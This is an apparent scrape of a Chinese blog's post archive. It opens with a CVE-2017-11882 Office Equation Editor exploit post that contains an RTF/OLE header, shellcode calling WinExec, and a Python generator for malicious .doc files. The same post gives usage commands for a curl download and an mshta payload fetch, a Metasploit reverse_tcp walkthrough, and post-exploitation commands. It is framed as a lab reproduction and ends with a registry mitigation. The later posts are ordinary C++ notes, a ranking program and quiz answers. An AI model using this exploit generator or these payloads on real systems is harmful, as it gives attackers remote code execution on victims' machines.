a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;tail=r&#x27;&#x27;&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000&#125;&#123;\\result &#123;\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 &#123;\\pict&#123;\\*\\picprop\\shplid1025&#123;\\sp&#123;\\sn shapeType&#125;&#123;\\sv 75&#125;&#125;&#123;\\sp&#123;\\sn fFlipH&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFlipV&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLockAspectRatio&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn pictureGray&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn pictureBiLevel&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fRecolorFillAsPicture&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fUseShapeAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFilled&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fHitTestFill&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fillShape&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fillUseRect&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fNoFillHitTest&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLine&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fPreferRelativeResize&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fReallyHidden&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fScriptAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFakeMaster&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fCameFromImgDummy&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLayoutInCell&#125;&#123;\\sv 1&#125;&#125;&#125;\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307&#123;\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;\\par&#125;&#x27;&#x27;&#x27;#0: b8 44 eb 71 12 mov eax,0x1271eb44#5: ba 78 56 34 12 mov edx,0x12345678#a: 31 d0 xor eax,edx#c: 8b 08 mov ecx,DWORD PTR [eax]#e: 8b 09 mov ecx,DWORD PTR [ecx]#10: 8b 09 mov ecx,DWORD PTR [ecx]#12: 66 83 c1 3c add cx,0x3c#16: 31 db xor ebx,ebx#18: 53 push ebx#19: 51 push ecx#1a: be 64 3e 72 12 mov esi,0x12723e64#1f: 31 d6 xor esi,edx#21: ff 16 call DWORD PTR [esi] // call WinExec#23: 53 push ebx#24: 66 83 ee 4c sub si,0x4c#28: ff 10 call DWORD PTR [eax] // call ExitProcessstage1=&quot;\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\x31\\xDB\\x53\\x51\\xBE\\x64\\x3E\\x72\\x12\\x31\\xD6\\xFF\\x16\\x53\\x66\\x83\\xEE\\x4C\\xFF\\x10&quot;# 用nop填充stage1=stage1.ljust(44,&#x27;\\x90&#x27;)def genrtf(cmd,r_head): if len(cmd) &gt; 109: print &quot;[!] Primitive command must be shorter than 109 bytes&quot; sys.exit(0) payload=&#x27;\\x1c\\x00\\x00\\x00\\x02\\x00\\x9e\\xc4\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\xa7\\\\\\x00\\xc4\\xee[\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ&#x27; payload+=stage1 payload+=pack(&#x27;&lt;I&#x27;,0x00402114) # ret 返回地址 payload+=&#x27;\\x00&#x27;*2 payload+=cmd payload=payload.ljust(197,&#x27;\\x00&#x27;) # FONT NAME以0x00结尾 197 = 0xA9 + 28 return r_head+objclass+payload.encode(&#x27;hex&#x27;)+taildef getrheader(file): input_file = open(file,&quot;r&quot;).read() r_header = input_file.split(&quot;&#123;\\*\\datastore&quot;)[0] return r_headerif __name__ == &#x27;__main__&#x27;: # 创建解析对象 parser = argparse.ArgumentParser(description=&quot;PoC for CVE-2017-11882&quot;) parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command run in target system&quot;, required=True) parser.add_argument(&#x27;-o&#x27;, &quot;--output&quot;, help=&quot;Output exploit rtf&quot;, required=True) parser.add_argument(&quot;-i&quot;, &quot;--input&quot;, help=&quot;Input normal rtf.&quot;, required=False) # 解析参数 args = parser.parse_args() # 制作rft文件的头部 if args.input != None: r_header = getrheader(args.input) else: r_header = head # 制作漏洞触发文件 with open(args.output,&#x27;wb&#x27;) as f: f.write(genrtf(args.cmd,r_header)) f.close() # 打印完成信息 print &quot;[*] Done ! output file --&gt; &quot; + args.output 远程下载这里给一个远程下载的示例 命令12# 这里使用109或605字节版本的poc均可python2 Command109b_CVE-2017-11882.py -c &#x27;cmd.exe /k &quot;md d:\\demo&amp;cd /d d:\\demo&amp;curl https://down.52pojie.cn/Tools/PEtools/LordPE.7z -o LordPE.zip&quot;&#x27; -o 11882-6.doc cmd用法参照123CMD /C 执行完关闭cmd窗口/K 执行完保留cmd窗口 多条命令执行 aa &amp;&amp; bb：执行aa，成功后再执行bb aa || bb：先执行aa，若执行成功则不再执行bb，若失败则再执行bb aa &amp; bb：先执行aa再执行bb，无论aa是否成功 PS：本地捆绑的尝试可以看看利用CVE-2017-11882尝试本地捆绑 漏洞复现参考文章：[漏洞复现] CVE-2017-11882 通杀所有Office版本Office系列漏洞之CVE-2017-11882 准备工作 攻击机：kali 靶机：win7，安装office office(先在主机上打开iso文件再传到虚拟机) office2007激活码(其他版本上网搜) 关闭win7的ASLR 关闭win7防火墙：开始-&gt;控制面板-&gt;系统与安全 虚拟机之间互相需要可以ping通：均使用net模式；编辑-&gt;虚拟网络编辑器-&gt;查看子网ip、win7(ipconfig)、kali(ifconfig)，保证在同一个网段 流程 将poc代码和组件下载到kali 把cve_2017_11882.rbcopy移动到kali的/usr/share/Metasploit-framework/modules/exploits/windows/smb把cve-2017-11882.rtf移动到kali的/usr/share/metasploit-framework/data/exploits 12# 进入Metasploit框架，在kali终端输入命令：msfconsole 12# 使用CVE-2017-11882.rb模块use exploit/windows/smb/cve_2017_11882 12# 设置tcp反弹会话set payload windows/meterpreter/reverse_tcp 12# 设置渗透机ip地址（这里通过ifconfig命令查看）set lhost 攻击机ip 12# 设置路径为11882，可自定义 set uripath 11882 12# 开启渗透，进入监听状态，只能开一个exploit 123# 生成带有shell的doc文件# 使用python2避免python报错：&#x27;hex&#x27; is not a text encoding; use codecs.encode() to handle arbitrary codecspython2 Command109b_CVE-2017-11882.py -c &quot;mshta http://渗透机ip:8080/11882&quot; -o 11882.doc 将doc文档移动到win7并打开，即可看到kali的监听端出现win7的shell 成功截图 后续操作 1234567891011121314151617# 通过命令sessions查看meterpreter会话：sessions# 进入会话sessions id(1或2或3...)# 查看系统信息 sysinfo # 查看当前用户 getuid # 截屏 screenshot# 进入windows命令行窗口shell 漏洞修复：取消该模块的注册123# 在cmd输入下列命令reg add &quot;HKLM\\SOFTWARE\\MICROSOFT\\Office\\Common\\COM Compatibility\\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400reg add &quot;HKLM\\SOFTWARE\\Wow6432Node\\Office\\Common\\COM Compatibility\\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400 小结：Winexec：主要用于运行exe文件 1UINT Winexec(exePath, ShowCmd); CreateProcess：用于创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件 x32dbgctrl + G: 输入函数名可以定位函数位置，或者输入内存地址可以进行跳转 进入函数时(第一个push还未执行)的ESP就是这个函数的返回地址，可以使用监视一直盯着这个地址的值看是否被改变 ESP、EBP指向的是存有数据的地址。你想嘛，mov eax, [ebp] 这个操作是不会修改ebp的值的，所以ebp指向的肯定是有效地址而非一个空位置 3CDaemon FTP使用教程：主机搭建FTP服务器供虚拟机访问，Vmware tools用不了的时候可以用这个传文件 1234567lea eax, [ebx+8]# lea就是load effective address，加载有效地址# 上述语句的意思是：将ebx+8赋给eax# 与mov区别：mov eax, [ebx+8]# 该语句是将地址为ebx+8的数据赋给eax 遇到别的问题的解决方案： 解决win7安装Vmware tools(1) 解决win7安装Vmware tools(2) OD报UDD路径错误： 去除UDD路径上所有中文名称 OD-&gt;Options-&gt;Appearance-&gt;手动设置UDD路径 因为od的启动需要管理员模式，导致exe被挂载了od之后也需要管理员模式才能启动(喵的这点上费了我好长时间，最后还是选择使用xdbg) 注册表中没有EQNEDT32.EXE，有两种方法： 打开注册表定位到计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options-&gt; 右键新建项命名为EQNEDT32.EXE-&gt;在该项中右键新建字符串Debbuger，值设置为调试器位置(xxx.od.exe) 使用windbg.exe同级目录下的gflags.exe的image files选项输入EQNEDT32.EXE与调试器的绝对路径","tags":"cve 捆绑"},{"title":"c++结课小结","url":"/post/9b670e9a.html","text":"期末周终于结束了哭唧唧~明天考完C++就正式进入暑假啦！ 对象所占据的空间只是用于存放数据成员，函数成员不计入，函数的代码在内存中只占据一份空间 使用复制构造函数的情形: ​ 用类的一个对象去初始化另一个对象时​ 当函数的形参是类的对象时（也就是值传递时），如果是引用传递则不会调用​ 当函数的返回值是类的对象时 未定义复制构造函数系统会自动给出，并且会执行: 浅复制(复制对象在内存中的每一个bit) ​ 浅复制是在复制这个对象的时候，让数据中的新旧对象指向同一个外部内容，析构的时候容易发生重复释放​ 深复制是在复制这个对象的时候，为数据中的对象制作了外部对象的独立复制。 复制构造函数有且仅有一个 123456// 复制构造，在定义对象的时候&#x27;=&#x27;是传参的意思A a; A b(a) // 等价于 A b=a; // 赋值A a, b; b = a; 函数名后面加const表示为常函数，在该函数当中不可以修改变量 1int getx() const &#123; return x; &#125; 函数参数尽量使用常引用而不是值，传递对象值会引起复制构造和析构，增加时间和空间开销 一个空类会自带四个函数: 构造函数，析构函数，复制构造函数，重载析构函数由系统调用(不可以由程序调用)，’~’不属于字母、数字或下划线，不是函数名 ‘&amp;&amp;a’: 右值引用 先构造的对象后析构(栈) 有生命的变量不一定能访问，局部定义静态变量在整个程序运行期间存在但是在主函数没法访问(private) 在类当中定义静态变量，数据改变只用修改一次，不用在每个对象都改一遍 类的静态数据成员为该类的所有对象共享，必须在类外定义和初始化(静态成员函数在类外定义不需要写static)，用::指明所属的类 只有构造函数和复制构造函数有冒号初始化用法 静态成员函数不可以访问非静态成员(故静态成员函数中的函数也是静态成员函数!!!)：因为静态成员函数是大家共有，非静态变量每个对象都有一个，如果通过类名+静态成员函数的方式调用的话不能确定输出哪一个对象的非静态变量 非友元函数访问私有成员的方法: 定义类的公有成员函数返回私有成员的值 A是B的友元，B不一定是A的友元，即友元关系是单向的 string类可以直接比较，不用字符串函数 全局变量和局部变量同名想要使用全局变量：::y(加全局作用域符) 定义类和函数的时候要注意顺序，如果类A要使用类B而类B的定义在类A之后，应该在类A之前先声明类B：class B; 函数同理 student stu[N];-&gt;对象数组已经被声明定义，只有靠赋值-&gt;stu[i] = student(id, score); 函数重载的要求(任选其一): 参数个数不同；参数类型不同；参数顺序不同；函数和自己的常函数 注意：编译器不会以返回值区分函数 常对象只能调用常成员函数，普通对象可以调用常成员函数和普通成员函数，但是会优先调用普通成员函数 常数据成员只能通过构造函数的冒号初始化或者在类外初始化，不能通过赋值初始化 常引用只是名字是常量，但它所指向的数据并非常数据，例如：一个对象a，其常引用是b，那么通过b不可以修改该对象成员，但是用a可以改变 头文件用双引号兼容尖括号，双引号会先查本地路径再查系统路径 友元函数可以在类里面定义，并且不会将其当作成员函数 int *p = new int(5), 小括号是赋值！！！中括号才是数组 this指针是常量，不可以赋值 new和delete可以达到的功能比malloc和free更强，可以实现在生成一个新的对象指针的同时进行构造并传入参数，并且delete会自动析构对象 默认构造函数=缺省构造函数 继承不会吸收构造函数和析构函数，派生类的构造函数与析构函数要自己写或者使用系统默认 赋值通过派生类传入，如果要用到基类的方法或者属性要通过派生类传入(构造函数冒号传入) 如果基类中有默认构造函数，派生类可以不定义构造函数，都使用默认构造函数 使用const定义时必须赋初值(可以不是编译期间可见的值，比如int b = 25; const int a = b;) 如果一个类包含多个对象成员，对象成员的构造函数的调用顺序由它们在该类中的说明顺序决定，而它们在初始化表中的顺序无关 重载运算符以后运算符对重载的数据类型的原有操作被弃用，但是对于其他类型的数据仍然可以使用 函数形参中，基类形参包容派生类实参，派生类形参不包含基类实参(派生类形参可能含有新的属性或方法，但基类实参中不存在) 标识符，包括变量名、常量名、对象名、函数名、类型名 命名规则： 1.标识符用字母A-Z,a-z,数字0-9和下划线_构成； 2.以字母（大小写）或者下划线_开头，开头不可以使用数字； 3.不能与c编译系统已经预定义的、具有特殊用途的保留标识符（即关键字）同名。比如，不能将标识符命名为float,auto,break,case,this,try,for,while,int,char,short, unsigned,等等； 4.不允许出现标点字符，比如 @、&amp; 和 %。 字符常量： （1）\\b：光标前移一位，同时会覆盖后面的内容 （2）\\r：将光标移到本行开头 （3）\\f： 在C++中，\\f仅仅会打出一个小正方形□，代表换页符 （4）\\v： 竖向跳格，就是将光标移到下一行的同样位置，但是，在C++中，\\v照样会输出一个替代的符号□ 枚举类型定义了一些整型符号常量的集合， 枚举类型的第一个常量默认值是0。 枚举类型常量的值允许彼此相同 虽然枚举类型常量是整数类型，但是不允许使用整数直接赋值给枚举类型变量，也不允许与整数进行运算，只可以与整数进行比较 在没有显式说明的情况下，枚举类型中的第一个枚举常量的值为0，第二个为1，以此类推。如果只指定了部分枚举常量的值，那么未指定值的枚举常量的值将依着最后一个指定值向后递增（步长为1） 真正编译后，编译器会加入 Run-time 库的 Startup 代码，它才是程序执行的真正入口。执行完 Startup 代码后，程序再调用用户代码的 main 函数执行。 Startup 代码中一般会获得命令行，获得进程句柄等。做好 main 函数的准备工作。而且不同的编译器，不同的平台，Startup 代码也不同。 在c++结构化程序设计框架中，程序的基本组成单元是函数 c++是面向过程和对象的程序设计语言 多态性是指一个面向对象的系统常常要求一组具有相同基本语义的方法能在同一接口下为不同的对象服务 面向对象的基本原理：使用现实世界的概念抽象地思考问题从而自然的解决问题 自顶向下属于结构化程序设计方法，可复用不属于结构化程序设计方法 面向对象程序设计主要考虑的是提高软件的可重用性 正确的程序注释一般包含序言性注释和功能性注释 引用必须在定义时初始化，而且一旦初始化之后，就不能再成为其他变量的引用 输入缓冲区和输出缓冲区可以重叠：在dos窗口上输入的数据，都会被放在输入缓冲区中，但是输入进去时也会显示在输出缓冲区上 break对于while和for循环都是直接退出，应该使用continue表示进行下一次循环 c/c++实型数据：实型数据表示形式有两种，即十进制小数形式（十六进制、八进制二进制不对）和指数形式一般形式：12.5、.6f（f表示浮点数类型）== 0.6指数形式：E可以大写或小写，整数部分和小数部分可以省略其一，但不能都省略，得是整数(1E.02不对) 函数重载的前提条件为不同函数实现的功能完全相同 友元类之间的关系，不能传递，不能继承 被abstract修饰的类，称为抽象类，抽象类不能被实例化，即不能使用new创建一个对象，只能被继承 类的组合关系：Has-A；继承和派生：Is-A 一般是将非常短小的函数声明为内联函数(inline)，且是否生效是由编译器决定 派生类中的虚函数会覆盖基类的虚函数，还会隐藏基类中同名函数的其他所有重载形式 STL中关联型容器都是有序的 覆盖: 派生类中定义和基类完全相同的成员 派生类指针不能用基类对象赋值；基类指针可以用派生类对象赋值; 看指针需要访问到的东西，赋值的数据是不是都有 派生类构造顺序：基类、对象成员、派生类本身-&gt;派生类多继承时按照对基类继承顺序执行初始化，再按照对象成员的说明顺序初始化最后执行派生类的初始化 派生类析构顺序与构造顺序相反 二义性问题: 派生类从不同方向继承同一个基类(菱形) 1234解决方法：虚基类：菱形第二层的两个基类虚继承顶层基类(class B1 : virtual public B), 构造第二个对象的时候引用第一次定义的最高基类同名隐藏：在派生类中定义同名成员类名限定 带参构造函数: 顶部基类的参数是由底部派生类决定，中间的两个基类不起作用 多继承普通基类按继承顺序构造，多继承普通基类和虚基类，先构造虚基类 最派生类给最基类传了参数，中间基类也得在构造函数传参 初始化列表不会影响构造顺序，但是多继承的继承顺序会影响 类指针的输出会参考指针类型 传入对象数组，不可以用引用来接收，要用指针！ 纯虚函数也是虚函数，纯虚函数的=0不是赋值，是一个语法标识 抽象类不能定义对象，但是可以定义指针(定义指针不用创建对象)，也可以定义引用(引用的是别的对象) 有至少一个纯虚函数的类是抽象类 抽象类只能作为基类，基类需要有构造和析构(派生类不会吸收基类的构造和析构函数) 抽象类是不完整的因为纯虚函数不完整(没有定义实现) 派生类继承抽象类，派生类只有一个函数，纯虚函数不算 12345678910class Base&#123; public: virtual void display() = 0;&#125;;class Derived : public Base&#123;public: void display();&#125;; // 本来有两个display函数，但是纯虚函数不完整，所以只算一个 虚函数是在派生类定义与基类完全相同的函数 虚函数必须是非静态的成员函数，静态成员函数无法区分是哪个对象, 构造函数不能是虚函数，析构函数可以（构造函数执行时对象还未创建好，析构函数执行时对象创建好了） 运行时多态：Base *p; p-&gt;fun()//fun为虚函数 则无法确定调用哪个函数 基类指针和基类引用可以使用基类和派生类对象赋值，实现多态(基类指针或引用+虚函数-&gt;多态) 绑定:确定执行哪个函数；绑定=联编；动态绑定 = 动态联编 = 运行时多态，静态绑定 = 静态联编 = 编译时多态 基类必须加virtual,派生类可加可不加 虚函数看对象类型，不是指针类型(运行时多态) 虚析构函数:防止使用基类析构函数析构派生类对象 Base *pb = new Derived; delete pb; // 删除只看指针类型进行析构，故只有Base的析构，会导致派生类对象无法析构，所以应该将基类的析构函数定义为虚函数 模板有两种，类模板和函数模板，类模板产生模板类，函数模板产生模板函数 一个函数/类模板可以生成无数多个模板函数/类 模板在编译后形成对应实例但是模板消失 #include &lt;bits/stdc++.h&gt;：通用的包含文件 函数模板不再满足要求时可以重载函数 #include &lt;cstdlib&gt;：c语言的stdlib.h s.getNum() = 8; // 如果返回的是私有成员的引用(需长期存在)，则可以用这种方式修改私有成员 #include &lt;assert&gt;：c语言的断言 assert(num &gt;= 0); // 如果num &lt; 0则程序崩溃 深赋值：对象之间的深赋值需要重载”=”并对数组等数据重新申请内存并赋值，并且需要删除原有内容 if (this != &amp; rhs) // 防止自我赋值 寻找素数：从2~sqrt(num)列出所有素数，如果num不可以被其中的任一素数整除，则num为素数","tags":"c++"},{"title":"比特串求解排名第k位的数据","url":"/post/4e4f7387.html","text":"前言最近听一个学长讲了如何利用比特串求解排名第k位的数据，觉得还挺巧妙的 分析下面以求解排名第k位和成绩第k小(即倒数排名为k)的学生成绩为例解释算法思路： 录入学生成绩后，将成绩转换为比特串，规则如下： 定义一个容量为101的整型数组存放比特串并初始化为0，学生成绩为n则数组下标为n的数据置1（0≤n≤100，故数组容量定为101） 例如：一个容量为6数据为2的数组按上述规则应为&#123;0, 0, 1, 0, 0, 0&#125; 将每个学生成绩的比特串逐列相加，得到一个聚合后的比特串 例如：&#123;0, 0, 0, 1, 0, 0&#125; 与 &#123;1, 0, 0, 0, 0, 0&#125;聚合后为&#123;1, 0, 0, 1, 0, 0&#125; 要得到排名为k(成绩相同认为排名相同)的学生成绩，只需要定义一个初值为0的sum，从高位下标向低位下标依次加上聚合比特串数组的数据，直到sum ≥ k，对应的下标就是排名为k的学生成绩 同理：要得到第k小的学生成绩，我们可以定义一个初值为0的sum，从低位下标向高位下标依次加上聚合比特串数组的数据，直到sum ≥ k，对应的下标就是第k小的学生成绩 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;assert.h&gt;using namespace std;#define N 101 // 采用百分制，0~100共101个数字int main()&#123; int n; cout &lt;&lt; &quot;请输入学生人数: &quot;; cin &gt;&gt; n; vector&lt;int&gt; grade(n); // 存放学生成绩 vector&lt;int&gt; bit(N, 0); // 初始化学生成绩比特串，并用于后续存放比特聚合后的数据 vector&lt;vector&lt;int&gt;&gt; bit_grade(n, bit); // 存放所有学生成绩比特串 // 录入成绩并转换为比特串 for (int i = 0; i &lt; n; ++i) &#123; cout &lt;&lt; &quot;请输入第&quot; &lt;&lt; i + 1 &lt;&lt; &quot;位学生的成绩: &quot;; cin &gt;&gt; grade[i]; assert(grade[i] &gt;= 0 &amp;&amp; grade[i] &lt;= 100); bit_grade[i][grade[i]] = 1; &#125; // 比特聚合，即同列相加 for (int i = 0; i &lt; N; ++i) &#123; for (int j = 0; j &lt; n; ++j) &#123; bit[i] += bit_grade[j][i]; // 分数相同归为同一排名 if (bit[i] &gt; 1) bit[i] = 1; &#125; &#125; // 比较 int k, sum = 0; int choice, stop = 1; while (stop == 1) &#123; sum = 0; cout &lt;&lt; &quot;正向排名请填1, 反向排名请填2: &quot;; cin &gt;&gt; choice; if (choice == 1) &#123; cout &lt;&lt; &quot;请问您需要排名第几的数据: &quot;; cin &gt;&gt; k; for (int i = 100; i &gt;= 0; --i) &#123; if (sum &gt;= k) &#123; cout &lt;&lt; &quot;排名第&quot; &lt;&lt; k &lt;&lt; &quot;的数据是: &quot; &lt;&lt; i + 1 &lt;&lt; endl; break; &#125; else &#123; sum += bit[i]; &#125; &#125; cout &lt;&lt; &quot;继续请填1, 停止请填2: &quot;; cin &gt;&gt; stop; cout &lt;&lt; endl; &#125; else &#123; assert(choice == 2); cout &lt;&lt; &quot;请问您需要第几小的数据: &quot;; cin &gt;&gt; k; for (int i = 0; i &lt; 101; ++i) &#123; if (sum &gt;= k) &#123; cout &lt;&lt; &quot;第&quot; &lt;&lt; k &lt;&lt; &quot;小的数据是: &quot; &lt;&lt; i - 1 &lt;&lt; endl; break; &#125; else &#123; sum += bit[i]; &#125; &#125; cout &lt;&lt; &quot;继续请填1, 停止请填2: &quot;; cin &gt;&gt; stop; cout &lt;&lt; endl; &#125; &#125; return 0; &#125;","tags":"c++刷题"},{"title":"C++填空题汇总","url":"/post/237e2b15.html","text":"题目 1. 除了可以通过对象名来引用静态成员，还可以使用类名引用静态成员。 2. 在C++中，每个类都有一个隐含的指针叫做this指针，该指针指向正在被成员函数操作的对象。 3. 在C++中，对象引用做函数参数要比对象指针做参数更普通。 4. 在常成员函数中，const是函数类型的一部分，在函数声明和函数定义部分都要有该关键字。 5. 常数据成员的值必须初始化且不能改变，因此在类中声明常数据成员时，只能通过构造函数成员初始化列表的方式来实现。 6. 静态数据成员初始化必须在类外进行。 7. 纯虚函数是一种特别的虚函数，它没有函数的函数体部分，也没有为函数的功能提供实现的代码，它的实现版本必须由派生类给出，因此纯虚函数不能是友元函数 8. 动态联编对函数的选择不是基于指针或者引用，而是基于对象，在编译、链接过程中无法解决的绑定问题要等到程序开始运行之后再确定 9. 按照联编所进行的阶段不同，可分为两种不同的联编方法：静态联编和动态联编 10. 强制类型转换是通过强制类型转换运算符来实现的 11. 函数重载和运算符重载都属于重载多态 12. 函数重载就是一种多态，相同的函数名，对应多个不同的函数体 13. 运算符重载函数的两种主要方式是成员函数和友元函数 14. 赋值运算符可以重载，但是无论参数为何种类型，赋值运算符都必须重载为成员函数，并且因为返回的是左值，所以返回值的类型必须是该类的引用 15. 定义一个函数名为fun，返回值为int，没有参数的纯虚函数的定义是virtual int fun()=0; 16. 动态多态性通过虚函数实现 17. 如果在类中定义了一个成员函数为虚函数，则表明在该继承层次链条的派生类中有可能重新定义这个成员函数的实现，即它可能被派生类的同名函数所覆盖 18. 如果类包含了一个或多个纯虚函数，则它是抽象类 19. 多态性分为两类：编译时的多态性和运行时的多态性 20. 虚函数必须是类的成员函数 21. 在面向对象的软件系统中，对象是基本的运行时实体，它既包含数据（属性），也包括作用于数据的操作 22. 基本概念 类是具体由共同属性和服务构成的一组对象的集合，它为属于该类的全部对象提供了抽象的描述，其内部包括属性和行为两个主要部分 23. 类通过接口与外界发生关系 24. 一个类只允许有一个父类，这样的继承称为单继承 25. 在面向对象程序设计方法中，对象是系统中用来描述客观事物的一个实体，它由数据和可执行的一组操作共同组成 26. 基本概念 对象根据所接受的消息而做出动作，同样的消息被不同的对象接受时可能导致完全不同的行为，这种现象称为多态 27. 继承是指使用已经存在的类定义作为基础建立新的类定义的技术 28. 类是对象的抽象，而一个对象则是其对应的一个实例 29. 在面向对象分析和设计中，通常把对象所进行的操作称为服务 30. 在面向对象的方法中，类的实例称为对象 31. 程序的开发步骤 一个 C/C++ 程序的开发步骤通常包括编辑、 编译、连接、运行和调试 32. 在面向对象程序设计中，程序中的一切操作都是通过向对象发送消息实现 33. 一个类允许有多个父类，这样的继承称为多继承 34. 关于全局变量全局变量也叫外部变量，它是在所有函数或程序块以外定义的变量 35. 关于位运算若有变量定义 int a = 13, b = 6; 则表达式 a &amp; b 的值为4 36. 主函数的名称 C/C++ 程序中必须包含一个名为main的函数，它被称为主函数。","tags":"c++刷题"},{"title":"自定义数组类","url":"/post/f0d4af91.html","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165#include &lt;cassert&gt;#include &lt;iostream&gt;#include &lt;stdexcept&gt;using namespace std;#define size_a 10#define size_b 20#define add_size 10// 数组类模板定义template &lt;class T&gt;class Array &#123;private: T *list; // T类型指针，用于存放动态分配的数组内存首地址 int size; // 数组大小（元素个数）public: Array(int sz = 50); // 构造函数 Array(const Array&lt;T&gt; &amp;a); // 拷贝构造函数 ~Array(); 